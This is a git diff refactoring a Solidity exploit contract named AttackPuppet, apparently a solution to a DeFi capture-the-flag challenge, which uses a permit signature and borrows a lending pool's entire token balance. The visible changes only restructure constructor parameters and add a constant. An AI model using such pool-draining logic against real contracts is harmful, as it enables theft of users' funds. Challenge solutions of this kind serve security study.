@@ -6,28 +6,16 @@ import "@openzeppelin/contracts/utils/Address.sol";
 contract AttackPuppet {
     using Address for address;
 
-    address private tokenAddress;
-    address private poolAddress;
-    address private swapAddress;
-    uint8 private v;
-    bytes32 private r;
-    bytes32 private s;
+    uint private constant POOL_INITIAL_TOKEN_BALANCE = 100000 * 10 ** 18;
 
     constructor(
-        address _tokenAdress,
-        address _poolAddress,
-        address _swapAddress,
-        uint8 _v,
-        bytes32 _r,
-        bytes32 _s
+        address tokenAddress,
+        address poolAddress,
+        address swapAddress,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
     ) payable {
-        tokenAddress = _tokenAdress;
-        poolAddress = _poolAddress;
-        swapAddress = _swapAddress;
-        v = _v;
-        r = _r;
-        s = _s;
-
         (, bytes memory data) = tokenAddress.staticcall(
             abi.encodeWithSignature("balanceOf(address)", msg.sender)
         );
@@ -77,7 +65,7 @@ contract AttackPuppet {
         poolAddress.functionCallWithValue(
             abi.encodeWithSignature(
                 "borrow(uint256,address)",
-                100000 * 10 ** 18,
+                POOL_INITIAL_TOKEN_BALANCE,
                 msg.sender
             ),
             msg.value
